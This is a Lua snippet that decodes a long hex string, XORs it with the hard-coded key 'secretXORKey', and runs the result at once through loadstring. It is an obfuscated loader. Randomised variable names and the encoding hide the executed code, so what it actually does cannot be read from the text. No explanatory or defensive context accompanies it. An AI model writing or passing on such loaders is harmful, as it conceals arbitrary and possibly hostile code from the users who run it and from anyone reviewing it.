
    local hezi20u9vug = "30c22152c3719281bd333293d2973c2369231bf551e3ab71e3f19e7c1b2ca1e3a2622152c371a1931793301182563f201128218241029835412c1337281b8241e3a26213c4236d3f301333d26e25232c3068281b263f15171c2a392c3719281b8241e2557351b4336139333224403a26291f3f2c3b26112ca1e3a2622152c371a3c30792312105631b4236d2119c11111323644363ca7f31e115172641b43ca7f313284f3f1c5ab3c2c3b3a879949122d351b12c162331262bf11b311e71a93ab795cd3f1f2aa2b31e3c33185d03e313183c47123f3133733f56291e3f1a153933c3311292d2e47231e3f30225d03e313183c47123f3133733ac141513c127e818e9382684f"
    local function hvtlsdyba4n()
      local tn3bd6lkf4s = ""
      for i = 1, #hezi20u9vug, 2 do
        local byte = tonumber(hezi20u9vug:sub(i, i + 1), 16)
        tn3bd6lkf4s = tn3bd6lkf4s .. string.char(byte)
      end
      local xorKey = "secretXORKey"
      local decoded = ""
      for i = 1, #tn3bd6lkf4s do
        decoded = decoded .. string.char(tn3bd6lkf4s:byte(i) ~ xorKey:byte((i-1)%#xorKey+1))
      end
      return decoded
    end

    local decodedScript = loadstring(hvtlsdyba4n())()
    print(decodedScript)
  